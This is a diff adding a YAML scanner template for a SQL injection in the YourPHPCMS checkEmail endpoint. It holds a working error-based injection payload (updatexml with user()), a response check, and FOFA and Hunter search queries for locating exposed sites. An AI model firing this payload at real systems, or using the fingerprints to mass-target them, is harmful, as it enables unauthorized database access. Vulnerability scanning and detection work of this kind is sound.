@@ -1,0 +1,15 @@
+name: YourPHPCMS-sqli  #YourPHPCMS
+rules: 
+  - method: GET  
+    path: /index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=' AND updatexml(1,concat(0x7e,user(),0x7e),1) --+
+    headers:
+    body:
+    expression:                        
+      status_code:                 
+      response_header:              
+      response_body: "@localhost"                      
+detail:                          
+  description: "YourPHPCMS‌是一款完全开源的PHP和MySQL系统，主要用于企业网站管理。它基于**ThinkPHP框架开发，支持多种功能模块，如内容管管理、用户管理、广告管理等‌。YourPHPCMS checkEmail接口存在SQL注入漏洞"
+  search:             
+    fofa: header="YP_onlineid"
+    鹰图: header="YP_onlineid"
